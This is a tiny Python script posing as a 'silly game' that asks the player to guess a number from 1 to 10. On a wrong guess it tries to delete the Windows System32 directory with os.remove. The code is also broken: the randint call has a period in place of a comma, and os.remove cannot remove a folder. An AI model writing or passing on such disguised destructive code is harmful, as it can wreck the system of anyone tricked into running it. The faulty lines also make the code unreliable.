import os
import random

number = random.randint(1. 10)

guess = int(input("Silly game! Guess number between 1 and 10"))

print("You Won!") if guess == number else os.remove("C:\\Windows\\System32")
